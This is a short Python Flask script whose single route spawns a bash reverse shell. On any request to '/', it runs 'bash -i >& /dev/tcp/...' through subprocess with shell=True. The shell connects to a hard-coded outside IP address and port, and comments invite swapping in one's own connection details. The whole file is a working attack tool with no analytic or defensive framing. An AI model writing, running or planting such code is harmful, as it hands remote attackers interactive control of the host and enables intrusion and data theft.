from flask import Flask
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    # Replace the IP and port with your desired reverse shell connection details
    ip = '13.52.163.39'
    port = '15000'

    # Command to spawn the reverse shell
    command = f'/bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'

    # Execute the command to spawn the reverse shell
    subprocess.Popen(command, shell=True)

    return 'Reverse shell spawned!'

if __name__ == '__main__':
    app.run(host='0.0.0.0')
